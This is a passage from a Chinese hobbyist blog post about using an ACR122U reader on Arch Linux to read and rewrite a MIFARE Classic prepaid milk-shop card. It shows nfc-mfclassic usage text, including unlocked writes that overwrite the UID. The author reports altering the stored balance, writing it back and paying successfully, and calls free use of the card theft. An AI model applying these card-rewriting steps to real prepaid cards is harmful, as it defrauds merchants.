+<h3 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">gorgias@3vil ~&gt; nfc-mfclassic</div><div class="line">Usage: nfc-mfclassic f|r|R|w|W a|b &amp;lt;dump.mfd&gt; [&amp;lt;keys.mfd&gt; [f]]</div><div class="line">  f|r|R|w|W     - Perform format (f) or read from (r) or unlocked read from (R) or write to (w) or unlocked write to (W) card</div><div class="line">                  *** format will reset all keys to FFFFFFFFFFFF and all data to 00 and all ACLs to default</div><div class="line">                  *** unlocked read does not require authentication and will reveal A and B keys</div><div class="line">                  *** note that unlocked write will attempt to overwrite block 0 including UID</div><div class="line">                  *** unlocking only works with special Mifare 1K cards (Chinese clones)</div><div class="line">  a|A|b|B       - Use A or B keys for action; Halt on errors (a|b) or tolerate errors (A|B)</div><div class="line">  &amp;lt;dump.mfd&gt;    - MiFare Dump (MFD) used to write (card to MFD) or (MFD to card)</div><div class="line">  &amp;lt;keys.mfd&gt;    - MiFare Dump (MFD) that contain the keys (optional)</div><div class="line">  f             - Force using the keyfile even if UID does not match (optional)</div><div class="line">Examples: </div><div class="line"></div><div class="line">  Read card to file, using key A:</div><div class="line"></div><div class="line">    nfc-mfclassic r a mycard.mfd</div><div class="line"></div><div class="line">  Write file to blank card, using key A:</div><div class="line"></div><div class="line">    nfc-mfclassic w a mycard.mfd</div><div class="line"></div><div class="line">  Write new data and/or keys to previously written card, using key A:</div><div class="line"></div><div class="line">    nfc-mfclassic w a newdata.mfd mycard.mfd</div><div class="line"></div><div class="line">  Format/wipe card (note two passes required to ensure writes for all ACL cases):</div><div class="line"></div><div class="line">    nfc-mfclassic f A dummy.mfd keyfile.mfd f</div><div class="line">    nfc-mfclassic f B dummy.mfd keyfile.mfd f</div></pre></td></tr></table></figure>
+<p>使用参数W可以改写空白MC1K卡的UID(某宝上面卖的那种)。<br><img src="https://gorgias.me/uploads/2016/10/IMG_20161018_1049091-e1477406819438-1024x768.jpg" alt="img_20161018_1049091"><br>这里把金额修改减少一毛钱，把修改好的数据写进去，再去鲜奶店刷卡成功，小票上面的金额也匹配。<br>结构很简单，完全可以“免费”喝奶。但是这和偷没什么区别了，奶店也是小本生意。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">gorgias@3vil ~&gt; nfc-mfclassic W a ~/temp/test.mfd ~/temp/old.mfd</div><div class="line">NFC reader: ACS / ACR122U PICC Interface opened</div><div class="line">Found MIFARE Classic card:</div><div class="line">ISO/IEC 14443A (106 kbps) target:</div><div class="line">    ATQA (SENS_RES): 00  04  </div><div class="line">       UID (NFCID1): 96  c2  d2  9d  </div><div class="line">      SAK (SEL_RES): 08  </div><div class="line">Guessing size: seems to be a 1024-byte card</div><div class="line">Writing 64 blocks |...............................................................|</div><div class="line">Done, 63 of 64 blocks written.</div></pre></td></tr></table></figure>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://cache.nxp.com/documents/application_note/AN10833.pdf" target="_blank" rel="external">[AN10833] MIFARE Type Identification Procedure</a></p>
+<p><a href="http://cache.nxp.com/documents/application_note/AN10927.pdf" target="_blank" rel="external">[AN10927] MIFARE and handling of UIDs</a></p>
+<p><a href="http://www.nxp.com/documents/application_note/AN1304.pdf" target="_blank" rel="external">[AN1304] NFC Type MIFARE Classic Tag Operation</a></p>
+<p><a href="http://nickholdren.com/wp-content/uploads/2009/07/capstone.pdf" target="_blank" rel="external">The Mifare Classic AuthenticationProcess</a></p>
+<p><a href="https://www.cs.bham.ac.uk/~garciaf/publications/Dismantling.Mifare.pdf" target="_blank" rel="external">Dismantling MIFARE Classic</a></p>
+<p><a href="https://www.blackhat.com/docs/sp-14/materials/arsenal/sp-14-Almeida-Hacking-MIFARE-Classic-Cards-Slides.pdf" target="_blank" rel="external">RFID Cooking with Mifare Classic</a></p>
+<p><a href="http://www.cnblogs.com/k1two2/p/5415400.html" target="_blank" rel="external">谈谈 Mifare Classic 破解 - K1two2</a><br><a href="http://www.freebuf.com/articles/wireless/8792.html" target="_blank" rel="external">RFID破解三两事(三篇文章和评论)</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://gorgias.me/2016/10/25/Arch-Linux上使用ACR122U破解鲜奶卡/" data-id="cj0ksyxgy0001k6bqmgtst76y" class="article-share-link">Partager</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ACR122U/">ACR122U</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Arch-Linux/">Arch Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/IC卡/">IC卡</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RFID/">RFID</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2016/11/13/QEMU初体验/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Récent</strong>
+      <div class="article-nav-title">
+        
+          KVM/QEMU初体验
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/10/08/五太子不能退休，快当我的备用机！/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Ancien</strong>
+      <div class="article-nav-title">五太子不能退休，快当我的备用机！</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Catégories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/OpenWrt/">OpenWrt</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/">工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/环境配置/">环境配置</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/硬件DIY/">硬件DIY</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/网络安全/">网络安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化/">虚拟化</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/设计/">设计</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Mot-clés</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ACR122U/">ACR122U</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Arch-Linux/">Arch Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/BIOS/">BIOS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ESXi/">ESXi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP-2/">HTTP/2</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IC卡/">IC卡</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Nexus5/">Nexus5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RFID/">RFID</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSL/">SSL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/TP-Link/">TP-Link</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/The-PostgreSQL-server-failed-to-start/">The PostgreSQL server failed to start</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VGA/">VGA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VMware/">VMware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/app/">app</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/arch/">arch</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bumblebee/">bumblebee</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/certificate-transparency/">certificate transparency</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ckfinder/">ckfinder</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker-hub/">docker hub</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/em/">em</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gitcafe/">gitcafe</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/https/">https</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kali/">kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kali手机版/">kali手机版</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kvm/">kvm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/menuconfig/">menuconfig</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nethunter/">nethunter</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nginx-openssl/">nginx.openssl</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nodejs/">nodejs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/openwrt/">openwrt</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/postgresql/">postgresql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/px/">px</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/qemu/">qemu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rem/">rem</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tplink/">tplink</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xorg/">xorg</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/东软/">东软</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/体验/">体验</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/像素/">像素</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/分辨率/">分辨率</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/区分/">区分</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/单位/">单位</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/博客/">博客</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/双显卡/">双显卡</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/固件/">固件</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/备用机/">备用机</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/失败/">失败</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/安卓/">安卓</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/安装/">安装</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/常见/">常见</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/折腾/">折腾</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/改装/">改装</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/救砖/">救砖</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/教程/">教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数字校园/">数字校园</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/格式/">格式</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/源码/">源码</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/砖/">砖</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/破解/">破解</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/硬改/">硬改</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/编程器/">编程器</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/编译/">编译</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/联想/">联想</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/虚拟化/">虚拟化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/虚拟机/">虚拟机</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/证书/">证书</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/路由器/">路由器</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/逆向分析/">逆向分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/闭源/">闭源</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/静态博客/">静态博客</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/黑屏/">黑屏</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Nuage de mot-clés</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ACR122U/" style="font-size: 10px;">ACR122U</a> <a href="/tags/Arch-Linux/" style="font-size: 10px;">Arch Linux</a> <a href="/tags/BIOS/" style="font-size: 10px;">BIOS</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/ESXi/" style="font-size: 10px;">ESXi</a> <a href="/tags/HTTP-2/" style="font-size: 10px;">HTTP/2</a> <a href="/tags/IC卡/" style="font-size: 10px;">IC卡</a> <a href="/tags/Nexus5/" style="font-size: 10px;">Nexus5</a> <a href="/tags/RFID/" style="font-size: 10px;">RFID</a> <a href="/tags/SSL/" style="font-size: 10px;">SSL</a> <a href="/tags/TP-Link/" style="font-size: 10px;">TP-Link</a> <a href="/tags/The-PostgreSQL-server-failed-to-start/" style="font-size: 10px;">The PostgreSQL server failed to start</a> <a href="/tags/VGA/" style="font-size: 10px;">VGA</a> <a href="/tags/VMware/" style="font-size: 10px;">VMware</a> <a href="/tags/app/" style="font-size: 10px;">app</a> <a href="/tags/arch/" style="font-size: 15px;">arch</a> <a href="/tags/bumblebee/" style="font-size: 10px;">bumblebee</a> <a href="/tags/certificate-transparency/" style="font-size: 10px;">certificate transparency</a> <a href="/tags/ckfinder/" style="font-size: 10px;">ckfinder</a> <a href="/tags/docker-hub/" style="font-size: 10px;">docker hub</a> <a href="/tags/em/" style="font-size: 10px;">em</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/gitcafe/" style="font-size: 10px;">gitcafe</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/https/" style="font-size: 10px;">https</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/kali/" style="font-size: 15px;">kali</a> <a href="/tags/kali手机版/" style="font-size: 10px;">kali手机版</a> <a href="/tags/kvm/" style="font-size: 10px;">kvm</a> <a href="/tags/linux/" style="font-size: 15px;">linux</a> <a href="/tags/menuconfig/" style="font-size: 10px;">menuconfig</a> <a href="/tags/mysql/" style="font-size: 10px;">mysql</a> <a href="/tags/nethunter/" style="font-size: 15px;">nethunter</a> <a href="/tags/nginx-openssl/" style="font-size: 10px;">nginx.openssl</a> <a href="/tags/nodejs/" style="font-size: 10px;">nodejs</a> <a href="/tags/openwrt/" style="font-size: 15px;">openwrt</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/postgresql/" style="font-size: 10px;">postgresql</a> <a href="/tags/px/" style="font-size: 10px;">px</a> <a href="/tags/qemu/" style="font-size: 10px;">qemu</a> <a href="/tags/rem/" style="font-size: 10px;">rem</a> <a href="/tags/tplink/" style="font-size: 10px;">tplink</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/xorg/" style="font-size: 10px;">xorg</a> <a href="/tags/东软/" style="font-size: 10px;">东软</a> <a href="/tags/体验/" style="font-size: 10px;">体验</a> <a href="/tags/像素/" style="font-size: 10px;">像素</a> <a href="/tags/分辨率/" style="font-size: 10px;">分辨率</a> <a href="/tags/区分/" style="font-size: 10px;">区分</a> <a href="/tags/单位/" style="font-size: 10px;">单位</a> <a href="/tags/博客/" style="font-size: 10px;">博客</a> <a href="/tags/双显卡/" style="font-size: 10px;">双显卡</a> <a href="/tags/固件/" style="font-size: 10px;">固件</a> <a href="/tags/备用机/" style="font-size: 10px;">备用机</a> <a href="/tags/失败/" style="font-size: 10px;">失败</a> <a href="/tags/安卓/" style="font-size: 10px;">安卓</a> <a href="/tags/安装/" style="font-size: 20px;">安装</a> <a href="/tags/常见/" style="font-size: 10px;">常见</a> <a href="/tags/折腾/" style="font-size: 10px;">折腾</a> <a href="/tags/改装/" style="font-size: 10px;">改装</a> <a href="/tags/救砖/" style="font-size: 10px;">救砖</a> <a href="/tags/教程/" style="font-size: 10px;">教程</a> <a href="/tags/数字校园/" style="font-size: 10px;">数字校园</a> <a href="/tags/格式/" style="font-size: 10px;">格式</a> <a href="/tags/源码/" style="font-size: 10px;">源码</a> <a href="/tags/砖/" style="font-size: 10px;">砖</a> <a href="/tags/破解/" style="font-size: 10px;">破解</a> <a href="/tags/硬改/" style="font-size: 10px;">硬改</a> <a href="/tags/编程器/" style="font-size: 10px;">编程器</a> <a href="/tags/编译/" style="font-size: 10px;">编译</a> <a href="/tags/联想/" style="font-size: 10px;">联想</a> <a href="/tags/虚拟化/" style="font-size: 15px;">虚拟化</a> <a href="/tags/虚拟机/" style="font-size: 10px;">虚拟机</a> <a href="/tags/证书/" style="font-size: 10px;">证书</a> <a href="/tags/路由器/" style="font-size: 10px;">路由器</a> <a href="/tags/逆向分析/" style="font-size: 10px;">逆向分析</a> <a href="/tags/闭源/" style="font-size: 10px;">闭源</a> <a href="/tags/静态博客/" style="font-size: 10px;">静态博客</a> <a href="/tags/黑屏/" style="font-size: 10px;">黑屏</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">June 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/05/">May 2015</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Articles récents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2017/02/24/源码编译OpenWrt固件笔记/">源码编译OpenWrt固件笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2017/01/17/Arch-Linux-双显卡-安装-NVIDIA-闭源驱动/">Arch Linux 双显卡 安装 NVIDIA 闭源驱动</a>
+          </li>
+        
+          <li>
+            <a href="/2016/11/13/QEMU初体验/">KVM/QEMU初体验</a>
+          </li>
+        
+          <li>
+            <a href="/2016/10/25/Arch-Linux上使用ACR122U破解鲜奶卡/">Arch Linux上使用ACR122U破解鲜奶卡</a>
+          </li>
+        
+          <li>
+            <a href="/2016/10/08/五太子不能退休，快当我的备用机！/">五太子不能退休，快当我的备用机！</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 Gorgias<br>
+      Propulsé by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
